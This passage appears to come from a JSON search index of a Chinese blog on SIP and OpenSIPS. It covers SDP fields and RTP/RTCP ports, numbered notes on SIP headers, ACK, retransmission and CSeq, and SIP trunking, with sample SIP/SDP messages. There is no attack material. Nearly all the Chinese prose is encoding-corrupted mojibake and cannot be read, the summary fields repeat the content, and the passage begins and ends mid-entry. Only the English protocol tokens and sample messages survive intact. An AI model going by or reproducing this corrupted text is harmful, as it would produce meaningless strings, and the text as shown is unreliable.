è¿æ¥åœ°å€ 2.4. m= åª’ä½“ä¿¡æ¯ æ ¼å¼\nm=media port transport format-list media åª’ä½“ç±»å‹ audio è¯­éŸ³ video è§†é¢‘ image ä¼ çœŸ port ç«¯å£å· transport ä¼ è¾“åè®® format-list æ ¼å¼ m=audio 49430 RTP/AVP 0 6 8 99 m=application 52341 udp wb 2.5. a= æ‰©å±•å±æ€§ 2.6. é€šç”¨æ‰©å±• 3. SDPä¸­çš„RTP RTCP ä¿¡æ¯ RTPçš„ç«¯å£ä¸€èˆ¬æ˜¯å¶æ•°ï¼Œä¾‹å¦‚ä¸‹é¢çš„4002ã€‚RTCPæ˜¯RTPç«¯å£ä¸‹é¢çš„ä¸€ä¸ªå¥‡æ•°ï¼Œå¦‚4003ã€‚ RTPä¸­ä¼ é€’çš„æ˜¯åª’ä½“ä¿¡æ¯ï¼ŒRTCPæ˜¯ç”¨äºæ§åˆ¶åª’ä½“ä¿¡æ¯ä¼ é€’çš„æ§åˆ¶ä¿¡ä»¤ï¼Œæµå…¥ä¸¢åŒ…çš„æ•°æ®ã€‚\nm=audio 4002 RTP/AVP 104 3 0 8 96 a=rtcp:4003 IN IP4 192.168.1.5 4. WebRTCä¸­çš„RTPå’ŒRTCPç«¯å£ åœ¨WebRTCä¸­ï¼ŒRTPå’ŒRTCPçš„ç«¯å£ä¸€èˆ¬æ˜¯å…¬ç”¨ä¸€ä¸ªã€‚ åœ¨INIVTEæ¶ˆæ¯çš„SDPä¸­ä¼šå¸¦æœ‰:\na=rtcp-mux å¦‚æœæœåŠ¡ç«¯åŒæ„å…¬ç”¨ä¸€ä¸ªç«¯å£ï¼Œå¹¶ä¸”INVITEè¯·æ±‚æˆåŠŸï¼Œé‚£ä¹ˆåœ¨200 OKçš„SDPä¸­å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„å†…å®¹ã€‚ å¯ä»¥çœ‹åˆ°RTPå’ŒRTCPå…¬ç”¨20512ç«¯å£ã€‚\nm=audio 20512 RTP/SAVPF 0 8 101 a=rtcp:20512 a=rtcp-mux 5. å‚è€ƒ https://www.ietf.org/rfc/rfc2327.txt ","permalink":"https://wdd.js.org/opensips/ch1/sip-with-sdp/","summary":"1. ä»€ä¹ˆæ˜¯SDP? SDPæ˜¯Session Description Protocolçš„ç¼©å†™ï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯ä¼šè¯æè¿°åè®®ï¼Œè¿™ä¸ªåè®®é€šå¸¸å­˜å‚¨å„ç§å’Œåª’ä½“ç›¸å…³çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ”¯æŒå“ªäº›åª’ä½“ç¼–ç , åª’ä½“ç«¯å£æ˜¯å¤šå°‘ï¼Ÿåª’ä½“IPåœ°å€æ˜¯å¤šå°‘ä¹‹ç±»çš„ã€‚\nSDPä¸€èˆ¬ä½œä¸ºSIPæ¶ˆæ¯çš„bodyéƒ¨åˆ†ã€‚å¦‚ä¸‹æ‰€ç¤º\nINVITE sip:bob@biloxi.example.com SIP/2.0 Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch=z9hG4bK74bf9 Max-Forwards: 70 From: Alice \u0026lt;sip:alice@atlanta.example.com\u0026gt;;tag=9fxced76sl To: Bob \u0026lt;sip:bob@biloxi.example.com\u0026gt; Call-ID: 3848276298220188511@atlanta.example.com CSeq: 1 INVITE Contact: \u0026lt;sip:alice@client.atlanta.example.com;transport=tcp\u0026gt; Content-Type: application/sdp Content-Length: 151 v=0 o=alice 2890844526 2890844526 IN IP4 client.atlanta.example.com s=- c=IN IP4 192.0.2.101 t=0 0 m=audio 49172 RTP/AVP 0 a=rtpmap:0 PCMU/8000 åˆšå¼€å§‹æˆ‘ä¸€ç›´è®¤ä¸ºæŸäº›sipæ¶ˆæ¯ä¸€å®šå¸¦æœ‰sdpï¼Œä¾‹å¦‚inviteæ¶ˆæ¯ã€‚æŸäº›sipè¯·æ±‚ä¸€å®šæ²¡æœ‰æºå¸¦sdpã€‚\nå®é™…ä¸Šsipæ¶ˆæ¯å’Œsdpå¹¶æ²¡æœ‰ç¡¬æ€§çš„é™„å±å…³ç³»ã€‚sipæ˜¯ç”¨æ¥ä¼ è¾“ä¿¡ä»¤çš„ï¼Œsdpæ˜¯ç”¨æ¥æè¿°åª’ä½“æµä¿¡æ¯çš„ã€‚\nå¦‚æœä¿¡ä»¤ä¸éœ€è¦æºå¸¦åª’ä½“æµä¿¡æ¯ï¼Œå°±å¯ä»¥ä¸ç”¨æºå¸¦sdpã€‚\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œinviteè¯·æ±‚éƒ½ä¼šå¸¦æœ‰sdpä¿¡æ¯ï¼Œä½†æ˜¯æŸäº›æ—¶å€™ä¹Ÿä¼šæ²¡æœ‰ã€‚ä¾‹å¦‚3PCC(third party call control), ç¬¬ä¸‰æ–¹å‘¼å«æ§åˆ¶ï¼Œæ˜¯æŒ‡ç”±ç¬¬ä¸‰æ–¹è´Ÿè´£åå•†åª’ä½“ä¿¡æ¯ã€‚\nå¸¸è§çš„ä¸€ä¸ªåœºæ™¯\n2. SDPå­—æ®µä»‹ç» 2.1. v= ç‰ˆæœ¬å· å½“å‰sdpçš„ç‰ˆæœ¬å·æ˜¯0ï¼Œæ‰€ä»¥å¸¸è§çš„éƒ½æ˜¯v=0\n2.2. o= å‘èµ·è€…id o=çš„æ ¼å¼","title":"SIPå’ŒSDPçš„å…³ç³»"},{"content":"1. sipåè®®ç”±request-uriè·¯ç”±ï¼Œè€Œä¸æ˜¯toå­—æ®µ sipæ¶ˆæ¯å†ç»è¿‡uaå‘é€å‡ºå»æ—¶ï¼Œrequest-uriå¯èƒ½ä¼šè¢«é‡å†™ï¼Œè€Œtoå­—æ®µï¼Œä¸€èˆ¬æ˜¯ä¸å˜çš„\n2. ä¸»å«ç”ŸæˆcallIdå’Œfrom tag, å“åº”to tagç”±å¦ä¸€æ–¹ç”Ÿæˆ totagçš„ä½œç”¨å¯ä»¥ç”¨æ¥åŒºåˆ†åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚\n3. sipæ¶ˆæ¯æœ‰å“ªäº›å¤´å­—æ®µæ˜¯å¿…é¡»çš„ï¼Ÿ Via Max-Forwards (è¯·æ±‚æ¶ˆæ¯å¿…é¡»æœ‰è¿™ä¸ªå¤´ï¼Œå“åº”æ¶ˆæ¯ä¸€èˆ¬æ²¡æœ‰è¿™ä¸ªå¤´) æ„Ÿè°¢ @genmzy æç¤ºã€‚ From To Call-ID CSeq 4. è¢«å«åœ¨å‘ä¸»å«å‘æ¶ˆæ¯æ—¶ï¼Œfromå’Œtoå­—æ®µä¸ºä»€ä¹ˆæ²¡å˜ï¼Ÿ fromå’Œtoå­—æ®µç”¨æ¥è¡¨åsip è¯·æ±‚çš„æ–¹å‘ï¼Œè€Œä¸æ˜¯sipæ¶ˆæ¯çš„æ–¹å‘ã€‚ä¸»å«å‘èµ·çš„è¯·æ±‚ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªdialogä¸­ï¼Œæ‰€æœ‰çš„sipæ¶ˆæ¯ï¼Œä¸»å«å’Œè¢«å«å­—æ®µéƒ½ä¸ä¼šå˜ã€‚\n5. ä¸ºä»€ä¹ˆæ‰€æœ‰viaå¤´ä¸­çš„branchéƒ½ä»¥z9hG4bKå¼€å¤´ è¿™ä¸ªå¤´æ˜¯rfc3261ä¸­è§„å®šçš„ï¼Œè¡¨ç¤ºå¥¹æ˜¯ç»è¿‡ä¸¥æ ¼è§„åˆ™ç”Ÿæˆçš„ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°äº‹åŠ¡ã€‚\n6. sipæœ‰ä¸¤ç§url, æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆåŒºåˆ« ç”¨æˆ·uri: AOR address of record, ä¾‹å¦‚fromå’Œtoå­—æ®µä¸­çš„url è®¾å¤‡uri: ä¾‹å¦‚ contactå¤´ ç”¨æˆ·uriç”¨æ¥å”¯ä¸€è®¤è¯ç”¨æˆ·ï¼Œè®¾å¤‡uriç”¨æ¥å”¯ä¸€è®¤è¯è®¾å¤‡ã€‚ ç”¨æˆ·uriå¾€å¾€éœ€è¦æŸ¥è¯¢æ•°æ®åº“ï¼Œè€Œè®¾å¤‡uriæ¥è‡ªè®¾å¤‡è‡ªå·±çš„ç½‘ç»œåœ°å€ï¼Œä¸éœ€è¦æŸ¥è¯¢æ•°æ®åº“ã€‚ ä¸€ä¸ªç”¨æˆ·å¯èƒ½æœ‰å¤šä¸ªè®¾å¤‡ 7. sipæ³¨å†Œå®é™…ä¸Šç»‘å®šç”¨æˆ·urlå’Œè®¾å¤‡ipåœ°å€ æˆ‘å¹¶ä¸èƒ½ç›´æ¥è”ç³»ä½ ï¼Œæˆ‘åªèƒ½ç”¨æˆ‘çš„æ‰‹æœºæ‹¨æ‰“ä½ çš„æ‰‹æœºã€‚\n8. å‘¼å«ç»“æŸäº†ï¼Œä¸ºä»€ä¹ˆå‘¼å«çš„çŠ¶æ€ä¿¡æ¯è¿˜éœ€è¦ç»´æŒä¸€æ®µæ—¶é—´ï¼Ÿ é‡ä¼ çš„inviteæ¶ˆæ¯ï¼Œå¯èƒ½åŒ…å«ç›¸åŒçš„callIå’Œcseq, ä¸ºäº†å½±å“åˆ°ä¹‹åçš„å‘¼å«ï¼Œéœ€è¦è€—å°½ç½‘ç»œä¸­é‡ä¼ çš„åŒ…ã€‚\n9. sip ç½‘å…³æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ ç½‘å…³çš„ä¸¤ä¾§é€šä¿¡åè®®æ˜¯ä¸åŒçš„ï¼Œç½‘å…³è´Ÿè´£å°†åè®®ç¿»è¯‘æˆå½¼æ­¤å¯ä»¥ç†è§£çš„åè®®ã€‚sipç½‘å…³ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ç”µè¯ç½‘ç»œçš„é€šä¿¡åè®®ä¸ä»…ä»…åªæœ‰sipï¼Œ è¿˜æœ‰å…¶ä»–çš„å„ç§ä¿¡ä»¤ï¼Œå¦‚ä¸ƒå·ä¿¡ä»¤ï¼ŒISDN, ISUP, CASç­‰ã€‚\n10. sipç»“æ„ç»„ä»¶ SIP User Agents Presence Agents B2B User Agents SIp Gateways SIP Server ä»£ç†æœåŠ¡å™¨ æ³¨å†ŒæœåŠ¡å™¨ é‡å®šå‘æœåŠ¡å™¨ 11. ä»£ç†æœåŠ¡å™¨å’ŒUAä¸ç½‘å…³çš„åŒºåˆ«ï¼Ÿ ä»£ç†æœåŠ¡å™¨æ²¡æœ‰åª’ä½“å¤„ç†èƒ½åŠ› ä»£ç†æœåŠ¡å™¨ä¸è§£ææ¶ˆæ¯ä½“ï¼Œåªè§£ææ¶ˆæ¯å¤´ ä»£ç†æœåŠ¡å™¨å¹¶ä¸åˆ†å‘æ¶ˆæ¯ 12. ä»€ä¹ˆæ˜¯Forking Proxy? Forking Proxyæ”¶åˆ°ä¸€ä¸ªINVITEè¯·æ±‚ï¼Œå´å‘å‡ºå»å¤šä¸ªINVITEæ¥å‘¼å«å¤šä¸ªUA, é€‚ç”¨äºå¤šäººä¼šè®®ã€‚ 13. SIP urlæœ‰å“ªäº›å½¢å¼ï¼Ÿ ä¸‹å›¾æ˜¯ sip url å‚æ•°åˆ—è¡¨ï¼š æ¯”è¾ƒé‡è¦çš„æœ‰\nlr ob transport 14. ACKè¯·æ±‚çš„è¦ç‚¹çŸ¥è¯† åªæœ‰INVITEéœ€è¦ACKç¡®è®¤ 2xxå“åº”çš„ACKç”±ä¸»å«æ–¹äº§ç”Ÿ 3xx, 4xx,5xx,6xxçš„ACKæ˜¯é€è·³çš„ï¼Œå¹¶ä¸”ä¸€èˆ¬æ˜¯ä»£ç†æœåŠ¡å™¨äº§ç”Ÿ 15. å¯é æ€§çš„æœºåˆ¶ é‡ä¼  T1 T2 sipå¦‚æœä½¿ç”¨tcpï¼Œ é‚£ä¹ˆtcpæ˜¯è‡ªå¸¦é‡ä¼ çš„ï¼Œä¸éœ€è¦sipå†åšé‡ä¼ æœºåˆ¶ã€‚å¦‚æœä½¿ç”¨udp, udpæœ¬èº«æ˜¯æ²¡æœ‰å¯é æ€§çš„ä¿è¯çš„ã€‚é‚£ä¹ˆè¿™å°±éœ€è¦åº”ç”¨å±‚å»è‡ªå·±å®ç°å¯é æ€§ã€‚\nè¯·æ±‚åœ¨å‘é€å‡ºå»æ—¶ï¼Œä¼šå¯åŠ¨å®šæ—¶å™¨ é‡ä¼ åœ¨è¾¾åˆ°64T1, å‘¼å«å®£å¸ƒå¤±è´¥ 16. ACK æ¶ˆæ¯ Cseq methodä¼šæ€æ ·æ”¹å˜ï¼Ÿ Cseqä¸å˜ methodå˜ä¸ºACK ä¸»å«æ–¹å‘é€ack, å…¶ä¸­ackçš„CSeqåºå·å’Œinviteä¿æŒä¸€è‡´ 17. ç«¯åˆ°ç«¯çš„ACKå’Œé€è·³çš„ACKæœ‰ä»€ä¹ˆåŒºåˆ« å¯¹200å“åº”çš„ACKæ˜¯ç«¯åˆ°ç«¯çš„ï¼Œå¯¹é200çš„ACKæ˜¯é€è·³çš„ ç«¯åˆ°ç«¯çš„ACKæ˜¯ä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œæœ‰æ–°çš„branchId é€è·³çš„ACKå’Œä¸Šä¸€ä¸ªINVITEè¯·æ±‚çš„branchIdä¸€è‡´ å½“ä½ æ”¶åˆ°ACKè¯·æ±‚æ—¶ï¼Œä½ è¦åˆ¤æ–­è¿™ä¸ªACKæ˜¯åº”å½“ç«‹å³ä¼ é€’åˆ°ä¸‹ä¸€è·³ï¼Œè¿˜æ˜¯è‡ªå·±å¤„ç† 18. éINVITEè¯·æ±‚çš„é‡ä¼  æ¶ˆæ¯å‘é€å‡ºå»æ—¶ï¼Œå¯åŠ¨å®šæ—¶å™¨ï¼Œå‘¨æœŸä¸ºT1 å¦‚æœå®šæ—¶å™¨è¿‡æœŸï¼Œåˆ™å†å¯åŠ¨å®šæ—¶å™¨ï¼Œå‘¨æœŸä¸º2T1, å‘¨æœŸ2å€é€’å¢ï¼Œå¦‚æœå‘¨æœŸåˆ°è¾¾T2, åˆ™ä»¥åçš„é‡ä¼ å‘¨æœŸéƒ½æ˜¯T2 å¦‚æœä¸­é—´æ”¶åˆ°äº†1xxçš„æ¶ˆæ¯ï¼Œåˆ™è®¡æ—¶å™¨ç«‹å³å°†å‘¨æœŸè®¾ç½®ä¸ºT2, å¹¶åœ¨T2è¿‡æœŸæ—¶å†æ¬¡é‡å‘ 19. INVITEè¯·æ±‚çš„é‡ä¼  è¯·æ±‚ä»¥2å€ä¹‹å‰çš„å‘¨æœŸæ‰§è¡Œé‡ä¼  å¦‚æœæ”¶åˆ°1xxçš„å“åº”ï¼Œåˆ™ä¸ä¼šå†é‡ä¼  20. ç«¯åˆ°ç«¯ä¸é€è·³çš„åŒºåˆ« 21. cancelæ¶ˆæ¯çš„ç‰¹ç‚¹ cancelæ˜¯é€è·³çš„ cancelçš„CSeqå’ŒbranchIdå’Œä¸Šä¸€ä¸ªinviteä¸€è‡´ ä¸€èˆ¬çš„cancelè¯·æ±‚å¤„ç†å›¾ 22. Viaçš„ç‰¹ç‚¹ è¯·æ±‚åœ¨ä¼ é€’ç»™ä¸‹ä¸€ç«™æ—¶ï¼ŒUAä¼šåœ¨åœ¨æœ€ä¸Šé¢åŠ ä¸Šè‡ªå·±çš„Viaå¤´ã€‚ branch tagæ¥è‡ª from, to, callId, request-urlçš„hashå€¼ å¤§å¤šæ•°sipå¤´çš„é¡ºåºéƒ½æ˜¯ä¸é‡è¦çš„ï¼Œä½†æ˜¯Viaçš„é¡ºåºå†³å®šäº†ï¼Œå“åº”åº”è¯¥é€åˆ°å“ªé‡Œ å¦‚æœè¯·æ±‚ä¸æ˜¯æ¥è‡ªViaå¤´ 23. 24 CSeq CSeq ä¼šæŒç»­å¢é•¿ï¼Œæœ‰å¯èƒ½ä¸ä¼šæŒ‰1é€’å¢ åŒä¸€ä¸ªäº‹åŠ¡çš„CSeqæ˜¯ç›¸åŒçš„ ACKçš„CSeqä¼šå’Œinviteä¸€è‡´ ","permalink":"https://wdd.js.org/opensips/ch1/sip-notes/","summary":"1. sipåè®®ç”±request-uriè·¯ç”±ï¼Œè€Œä¸æ˜¯toå­—æ®µ sipæ¶ˆæ¯å†ç»è¿‡uaå‘é€å‡ºå»æ—¶ï¼Œrequest-uriå¯èƒ½ä¼šè¢«é‡å†™ï¼Œè€Œtoå­—æ®µï¼Œä¸€èˆ¬æ˜¯ä¸å˜çš„\n2. ä¸»å«ç”ŸæˆcallIdå’Œfrom tag, å“åº”to tagç”±å¦ä¸€æ–¹ç”Ÿæˆ totagçš„ä½œç”¨å¯ä»¥ç”¨æ¥åŒºåˆ†åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚\n3. sipæ¶ˆæ¯æœ‰å“ªäº›å¤´å­—æ®µæ˜¯å¿…é¡»çš„ï¼Ÿ Via Max-Forwards (è¯·æ±‚æ¶ˆæ¯å¿…é¡»æœ‰è¿™ä¸ªå¤´ï¼Œå“åº”æ¶ˆæ¯ä¸€èˆ¬æ²¡æœ‰è¿™ä¸ªå¤´) æ„Ÿè°¢ @genmzy æç¤ºã€‚ From To Call-ID CSeq 4. è¢«å«åœ¨å‘ä¸»å«å‘æ¶ˆæ¯æ—¶ï¼Œfromå’Œtoå­—æ®µä¸ºä»€ä¹ˆæ²¡å˜ï¼Ÿ fromå’Œtoå­—æ®µç”¨æ¥è¡¨åsip è¯·æ±‚çš„æ–¹å‘ï¼Œè€Œä¸æ˜¯sipæ¶ˆæ¯çš„æ–¹å‘ã€‚ä¸»å«å‘èµ·çš„è¯·æ±‚ï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªdialogä¸­ï¼Œæ‰€æœ‰çš„sipæ¶ˆæ¯ï¼Œä¸»å«å’Œè¢«å«å­—æ®µéƒ½ä¸ä¼šå˜ã€‚\n5. ä¸ºä»€ä¹ˆæ‰€æœ‰viaå¤´ä¸­çš„branchéƒ½ä»¥z9hG4bKå¼€å¤´ è¿™ä¸ªå¤´æ˜¯rfc3261ä¸­è§„å®šçš„ï¼Œè¡¨ç¤ºå¥¹æ˜¯ç»è¿‡ä¸¥æ ¼è§„åˆ™ç”Ÿæˆçš„ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°äº‹åŠ¡ã€‚\n6. sipæœ‰ä¸¤ç§url, æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆåŒºåˆ« ç”¨æˆ·uri: AOR address of record, ä¾‹å¦‚fromå’Œtoå­—æ®µä¸­çš„url è®¾å¤‡uri: ä¾‹å¦‚ contactå¤´ ç”¨æˆ·uriç”¨æ¥å”¯ä¸€è®¤è¯ç”¨æˆ·ï¼Œè®¾å¤‡uriç”¨æ¥å”¯ä¸€è®¤è¯è®¾å¤‡ã€‚ ç”¨æˆ·uriå¾€å¾€éœ€è¦æŸ¥è¯¢æ•°æ®åº“ï¼Œè€Œè®¾å¤‡uriæ¥è‡ªè®¾å¤‡è‡ªå·±çš„ç½‘ç»œåœ°å€ï¼Œä¸éœ€è¦æŸ¥è¯¢æ•°æ®åº“ã€‚ ä¸€ä¸ªç”¨æˆ·å¯èƒ½æœ‰å¤šä¸ªè®¾å¤‡ 7. sipæ³¨å†Œå®é™…ä¸Šç»‘å®šç”¨æˆ·urlå’Œè®¾å¤‡ipåœ°å€ æˆ‘å¹¶ä¸èƒ½ç›´æ¥è”ç³»ä½ ï¼Œæˆ‘åªèƒ½ç”¨æˆ‘çš„æ‰‹æœºæ‹¨æ‰“ä½ çš„æ‰‹æœºã€‚\n8. å‘¼å«ç»“æŸäº†ï¼Œä¸ºä»€ä¹ˆå‘¼å«çš„çŠ¶æ€ä¿¡æ¯è¿˜éœ€è¦ç»´æŒä¸€æ®µæ—¶é—´ï¼Ÿ é‡ä¼ çš„inviteæ¶ˆæ¯ï¼Œå¯èƒ½åŒ…å«ç›¸åŒçš„callIå’Œcseq, ä¸ºäº†å½±å“åˆ°ä¹‹åçš„å‘¼å«ï¼Œéœ€è¦è€—å°½ç½‘ç»œä¸­é‡ä¼ çš„åŒ…ã€‚\n9. sip ç½‘å…³æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ ç½‘å…³çš„ä¸¤ä¾§é€šä¿¡åè®®æ˜¯ä¸åŒçš„ï¼Œç½‘å…³è´Ÿè´£å°†åè®®ç¿»è¯‘æˆå½¼æ­¤å¯ä»¥ç†è§£çš„åè®®ã€‚sipç½‘å…³ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ç”µè¯ç½‘ç»œçš„é€šä¿¡åè®®ä¸ä»…ä»…åªæœ‰sipï¼Œ è¿˜æœ‰å…¶ä»–çš„å„ç§ä¿¡ä»¤ï¼Œå¦‚ä¸ƒå·ä¿¡ä»¤ï¼ŒISDN, ISUP, CASç­‰ã€‚\n10. sipç»“æ„ç»„ä»¶ SIP User Agents Presence Agents B2B User Agents SIp Gateways SIP Server ä»£ç†æœåŠ¡å™¨ æ³¨å†ŒæœåŠ¡å™¨ é‡å®šå‘æœåŠ¡å™¨ 11.","title":"SIPåè®®æ‹¾é—è¡¥ç¼º"},{"content":"ä¼ ç»Ÿä¸­ç»§ sip trunkä¸­ç»§ å®‰å…¨å¯é ï¼šSIP Trunkè®¾å¤‡å’ŒITSPä¹‹é—´åªéœ€å»ºç«‹å”¯ä¸€çš„ã€å®‰å…¨çš„ã€å…·æœ‰QoSä¿è¯çš„SIP Trunké“¾è·¯ã€‚é€šè¿‡è¯¥é“¾è·¯æ¥æ‰¿è½½ä¼ä¸šçš„å¤šè·¯å¹¶å‘å‘¼å«ï¼Œè¿è¥å•†åªéœ€å¯¹è¯¥é“¾è·¯è¿›è¡Œé‰´æƒï¼Œä¸å†å¯¹æ‰¿è½½äºè¯¥é“¾è·¯ä¸Šçš„æ¯ä¸€è·¯SIPå‘¼å«è¿›è¡Œé‰´æƒã€‚ èŠ‚çº¦ç¡¬ä»¶æˆæœ¬ï¼šä¼ä¸šå†…éƒ¨é€šä¿¡ç”±ä¼ä¸šIP-PBXè´Ÿè´£ã€‚ä¼ä¸šæ‰€æœ‰å¤–å‡ºé€šä¿¡éƒ½é€šè¿‡SIP Trunkäº¤ç”±ITSPï¼Œå†ç”±ITSPä¸­çš„è®¾å¤‡å‘é€åˆ°PSTNç½‘ç»œï¼Œä¼ä¸šä¸å†éœ€è¦ç»´æŠ¤åŸæœ‰çš„ä¼ ç»ŸPSTNä¸­ç»§é“¾è·¯ï¼ŒèŠ‚çœäº†ç¡¬ä»¶å’Œç»´æŠ¤æˆæœ¬ã€‚ èŠ‚çº¦è¯è´¹æˆæœ¬ï¼šä¼ä¸šå¯ä»¥é€šè¿‡è®¾ç½®ç›®çš„åœ°å€ä»»æ„é€‰æ‹©å¹¶è¿æ¥åˆ°å¤šä¸ªITSPï¼Œå……åˆ†åˆ©ç”¨éå¸ƒå…¨çƒå„åœ°çš„ITSPï¼ŒèŠ‚çœé€šè¯è´¹ç”¨ã€‚ åŠŸèƒ½å¼ºå¤§ï¼šéƒ¨ç½²SIP Trunkè®¾å¤‡åï¼Œå…¨ç½‘å¯ä»¥ä½¿ç”¨SIPåè®®ï¼Œå¯ä»¥æ›´å¥½çš„æ”¯æŒè¯­éŸ³ã€ä¼šè®®ã€å³æ—¶æ¶ˆæ¯ç­‰IPé€šä¿¡ä¸šåŠ¡ã€‚ å¤„ç†ä¿¡ä»¤å’Œåª’ä½“ï¼šSIP Trunkè®¾å¤‡ä¸åŒäºSIPä»£ç†æœåŠ¡å™¨ã€‚SIP Trunkè®¾å¤‡æ¥æ”¶åˆ°ç”¨æˆ·çš„å‘¼å«è¯·æ±‚åï¼Œä¼šä»£è¡¨ç”¨æˆ·å‘ITSPå‘èµ·æ–°å‘¼å«è¯·æ±‚ã€‚åœ¨è½¬å‘è¿‡ç¨‹ä¸­ï¼ŒSIP Trunkè®¾å¤‡ä¸ä½†è¦å¯¹ä¿¡ä»¤æ¶ˆæ¯è¿›è¡Œä¸­ç»§è½¬å‘ï¼Œå¯¹RTPåª’ä½“æ¶ˆæ¯ä¹Ÿéœ€è¦è¿›è¡Œä¸­ç»§è½¬å‘ã€‚åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼ŒSIP Trunkè®¾å¤‡ä¸¤ç«¯çš„è®¾å¤‡ï¼ˆä¼ä¸šå†…éƒ¨å’Œä¼ä¸šå¤–éƒ¨è®¾å¤‡ï¼‰å‡è®¤ä¸ºå’Œå…¶äº¤äº’çš„æ˜¯SIP Trunkè®¾å¤‡æœ¬èº«ã€‚ å‚è€ƒ http://www.h3c.com/cn/d_201009/688762_30003_0.htm https://getvoip.com/blog/2013/01/24/differences-between-sip-trunking-and-hosted-pbx/ https://www.onsip.com/blog/hosted-pbx-vs-sip-trunking https://baike.baidu.com/item/sip%20trunk/1499860 ","permalink":"https://wdd.js.org/opensips/ch1/trunk-pbx-gateway/","summary":"ä¼ ç»Ÿä¸­ç»§ sip trunkä¸­ç»§ å®‰å…¨å¯é ï¼šSIP Trunkè®¾å¤‡å’ŒITSPä¹‹é—´åªéœ€å»ºç«‹å”¯ä¸€çš„ã€å®‰å…¨çš„ã€å…·æœ‰QoSä¿è¯çš„SIP Trunké“¾è·¯ã€‚é€šè¿‡è¯¥é“¾è·¯æ¥æ‰¿è½½ä¼ä¸šçš„å¤šè·¯å¹¶å‘å‘¼å«ï¼Œè¿è¥å•†åªéœ€å¯¹è¯¥é“¾è·¯è¿›è¡Œé‰´æƒï¼Œä¸å†å¯¹æ‰¿è½½äºè¯¥é“¾è·¯ä¸Šçš„æ¯ä¸€è·¯SIPå‘¼å«è¿›è¡Œé‰´æƒã€‚ èŠ‚çº¦ç¡¬ä»¶æˆæœ¬ï¼šä¼ä¸šå†…éƒ¨é€šä¿¡ç”±ä¼ä¸šIP-PBXè´Ÿè´£ã€‚ä¼ä¸šæ‰€æœ‰å¤–å‡ºé€šä¿¡éƒ½é€šè¿‡SIP Trunkäº¤ç”±ITSPï¼Œå†ç”±ITSPä¸­çš„è®¾å¤‡å‘é€åˆ°PSTNç½‘ç»œï¼Œä¼ä¸šä¸å†éœ€è¦ç»´æŠ¤åŸæœ‰çš„ä¼ ç»ŸPSTNä¸­ç»§é“¾è·¯ï¼ŒèŠ‚çœäº†ç¡¬ä»¶å’Œç»´æŠ¤æˆæœ¬ã€‚ èŠ‚çº¦è¯è´¹æˆæœ¬ï¼šä¼ä¸šå¯ä»¥é€šè¿‡è®¾ç½®ç›®çš„åœ°å€ä»»æ„é€‰æ‹©å¹¶è¿æ¥åˆ°å¤šä¸ªITSPï¼Œå……åˆ†åˆ©ç”¨éå¸ƒå…¨çƒå„åœ°çš„ITSPï¼ŒèŠ‚çœé€šè¯è´¹ç”¨ã€‚ åŠŸèƒ½å¼ºå¤§ï¼šéƒ¨ç½²SIP Trunkè®¾å¤‡åï¼Œå…¨ç½‘å¯ä»¥ä½¿ç”¨SIPåè®®ï¼Œå¯ä»¥æ›´å¥½çš„æ”¯æŒè¯­éŸ³ã€ä¼šè®®ã€å³æ—¶æ¶ˆæ¯ç­‰IPé€šä¿¡ä¸šåŠ¡ã€‚ å¤„ç†ä¿¡ä»¤å’Œåª’ä½“ï¼šSIP Trunkè®¾å¤‡ä¸åŒäºSIPä»£ç†æœåŠ¡å™¨ã€‚SIP Trunkè®¾å¤‡æ¥æ”¶åˆ°ç”¨æˆ·çš„å‘¼å«è¯·æ±‚åï¼Œä¼šä»£è¡¨ç”¨æˆ·å‘ITSPå‘èµ·æ–°å‘¼å«è¯·æ±‚ã€‚åœ¨è½¬å‘è¿‡ç¨‹ä¸­ï¼ŒSIP Trunkè®¾å¤‡ä¸ä½†è¦å¯¹ä¿¡ä»¤æ¶ˆæ¯è¿›è¡Œä¸­ç»§è½¬å‘ï¼Œå¯¹RTPåª’ä½“æ¶ˆæ¯ä¹Ÿéœ€è¦è¿›è¡Œä¸­ç»§è½¬å‘ã€‚åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼ŒSIP Trunkè®¾å¤‡ä¸¤ç«¯çš„è®¾å¤‡ï¼ˆä¼ä¸šå†…éƒ¨å’Œä¼ä¸šå¤–éƒ¨è®¾å¤‡ï¼‰å‡è®¤ä¸ºå’Œå…¶äº¤äº’çš„æ˜¯SIP Trunkè®¾å¤‡æœ¬èº«ã€‚ å‚è€ƒ http://www.h3c.com/cn/d_201009/688762_30003_0.htm https://getvoip.com/blog/2013/01/24/differences-between-sip-trunking-and-hosted-pbx/ https://www.onsip.com/blog/hosted-pbx-vs-sip-trunking https://baike.baidu.com/item/sip%20trunk/1499860 ","title":"Trunk Pbx Gateway"},{"content":"RFC3261å¹¶æ²¡æœ‰ä»‹ç»å…³äºPathå¤´çš„å®šä¹‰ï¼Œå› ä¸ºè¿™ä¸ªå¤´æ˜¯åœ¨RFC3327ä¸­å®šä¹‰çš„ï¼ŒPathå¤´ä½œä¸ºä¸€ä¸ªSIPçš„æ‰©å±•å¤´ã€‚\nRFC3327çš„æ ‡é¢˜æ˜¯ï¼šSession Initiation Protocol (SIP) Extension Header Field for Registering Non-Adjacent Contactsã€‚\nä»è¿™ä¸ªæ 